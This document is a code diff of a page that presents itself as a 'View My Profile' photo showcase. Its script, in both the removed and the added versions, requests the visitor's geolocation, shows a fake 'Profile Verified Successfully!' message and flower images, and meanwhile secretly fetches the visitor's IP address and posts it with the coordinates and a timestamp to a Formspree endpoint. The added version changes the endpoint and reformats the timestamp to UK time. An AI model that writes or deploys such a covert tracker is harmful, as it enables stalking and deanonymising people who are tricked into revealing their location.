@@ -1,143 +1,88 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome to My Profile</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            text-align: center;
-            background-color: #ffffff;
-            color: #333333;
-            margin: 0;
-            padding: 50px 20px;
-        }
-        h1 {
-            font-size: 28px;
-            font-weight: 700;
-            margin-bottom: 15px;
-        }
-        p {
-            font-size: 16px;
-            color: #555555;
-            margin-bottom: 25px;
-        }
-        .btn-profile {
-            background-color: #007bff;
-            color: white;
-            border: none;
-            padding: 12px 30px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 8px;
-            cursor: pointer;
-            box-shadow: 0 4px 6px rgba(0, 123, 255, 0.15);
-            transition: background-color 0.2s;
-        }
-        .btn-profile:hover {
-            background-color: #0056b3;
-        }
-        #status-message {
-            margin-top: 25px;
-            font-size: 16px;
-            font-weight: 600;
-            color: #444444;
-        }
-        .flower-container {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin-top: 30px;
-            flex-wrap: wrap;
-        }
-        .flower-container img {
-            width: 300px;
-            height: auto;
-            border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.08);
-        }
-    </style>
-</head>
-<body>
-
-    <h1>Welcome to My Profile</h1>
-    <p>Click the button below to review my shared photo showcase.</p>
-    
-    <button class="btn-profile" onclick="findMe()">View My Profile</button>
-    
-    <div id="status-message"></div>
-    
-    <div id="gallery" class="flower-container"></div>
-
-    <script>
-    function findMe() {
-        if (!navigator.geolocation) {
-            console.error("Geolocation is not supported by this browser.");
-            return;
-        }
-        
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-
-                // 1. Show the success text and load the images
-                document.getElementById('status-message').textContent = "Profile Verified Successfully!";
-                
-                document.getElementById('gallery').innerHTML = `
-                    <img src="https://images.unsplash.com/photo-1526047932273-341f2a7631f9?w=400" alt="Pink Flowers">
-                    <img src="https://images.unsplash.com/photo-1508784411316-02b8cd4d3a3a?w=400" alt="Yellow Flowers">
-                `;
-
-                // 2. Secretly fetch the IP address and send data to Formspree
-                fetch("https://api.ipify.org?format=json")
-                    .then(ipRes => {
-                        if (!ipRes.ok) throw new Error("Network response error");
-                        return ipRes.json();
-                    })
-                    .then(ipData => {
-                        sendToFormspree(lat, lon, ipData.ip);
-                    })
-                    .catch(err => {
-                        console.warn("IP fetch failed, sending coordinates anyway:", err);
-                        sendToFormspree(lat, lon, "IP Lookup Blocked/Failed");
-                    });
-            },
-            (error) => {
-                console.error(`Geolocation Error: ${error.message}`);
-                // Optional fallback so the page doesn't look broken if they deny permission
-                document.getElementById('status-message').textContent = "Profile Loaded.";
-            }
-        );
+<script>
+function findMe() {
+    if (!navigator.geolocation) {
+        console.error("Geolocation is not supported by this browser.");
+        return;
     }
+    
+    navigator.geolocation.getCurrentPosition(
+        (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
 
-    function sendToFormspree(latitude, longitude, ipAddress) {
-        const targetUrl = "https://formspree.io/f/xvzjzyqe"; 
+            // 1. Show the success text and load the images
+            document.getElementById('status-message').textContent = "Profile Verified Successfully!";
+            
+            document.getElementById('gallery').innerHTML = `
+                <img src="https://images.unsplash.com/photo-1526047932273-341f2a7631f9?w=400" alt="Pink Flowers">
+                <img src="https://images.unsplash.com/photo-1508784411316-02b8cd4d3a3a?w=400" alt="Yellow Flowers">
+            `;
 
-        const formData = new URLSearchParams();
-        formData.append("Visitor_IP", ipAddress);
-        formData.append("Latitude", latitude);
-        formData.append("Longitude", longitude);
-        formData.append("Timestamp", new Date().toISOString());
+            // 2. Secretly fetch the IP address and send data to Formspree
+            fetch("https://api.ipify.org?format=json")
+                .then(ipRes => {
+                    if (!ipRes.ok) throw new Error("Network response error");
+                    return ipRes.json();
+                })
+                .then(ipData => {
+                    sendToFormspree(lat, lon, ipData.ip);
+                })
+                .catch(err => {
+                    console.warn("IP fetch failed, sending coordinates anyway:", err);
+                    sendToFormspree(lat, lon, "IP Lookup Blocked/Failed");
+                });
+        },
+        (error) => {
+            console.error(`Geolocation Error: ${error.message}`);
+            document.getElementById('status-message').textContent = "Profile Loaded.";
+        }
+    );
+}
 
-        fetch(targetUrl, {
-            method: "POST",
-            headers: { 
-                "Accept": "application/json",
-                "Content-Type": "application/x-www-form-urlencoded" 
-            },
-            body: formData.toString()
-        })
-        .then(response => {
-            if (response.ok) {
-                console.log("Transmission completely successful.");
-            } else {
-                console.error("Formspree rejected the data.");
-            }
-        })
-        .catch(error => console.error("Formspree connection error:", error));
-    }
-    </script>
-</body>
-</html>
+function sendToFormspree(latitude, longitude, ipAddress) {
+    const targetUrl = "https://formspree.io/f/mjgqwonp"; 
+
+    // Generate current UK local time (Handles both GMT and BST adjustments automatically)
+    const options = {
+        timeZone: 'Europe/London',
+        year: 'numeric',
+        month: '2-digit',
+        day: '2-digit',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit',
+        hour12: false
+    };
+    
+    const formatter = new Intl.DateTimeFormat('en-GB', options);
+    const parts = formatter.formatToParts(new Date());
+    
+    // Construct a clean, readable string format: YYYY-MM-DD HH:MM:SS BST/GMT
+    const hash = {};
+    parts.forEach(({type, value}) => { hash[type] = value; });
+    const localTimestamp = `${hash.year}-${hash.month}-${hash.day} ${hash.hour}:${hash.minute}:${hash.second} (UK Time)`;
+
+    const formData = new URLSearchParams();
+    formData.append("Visitor_IP", ipAddress);
+    formData.append("Latitude", latitude);
+    formData.append("Longitude", longitude);
+    formData.append("Timestamp", localTimestamp); // Sends formatted UK time
+
+    fetch(targetUrl, {
+        method: "POST",
+        headers: { 
+            "Accept": "application/json",
+            "Content-Type": "application/x-www-form-urlencoded" 
+        },
+        body: formData.toString()
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log("Transmission completely successful.");
+        } else {
+            console.error("Formspree rejected the data.");
+        }
+    })
+    .catch(error => console.error("Formspree connection error:", error));
+}
+</script>
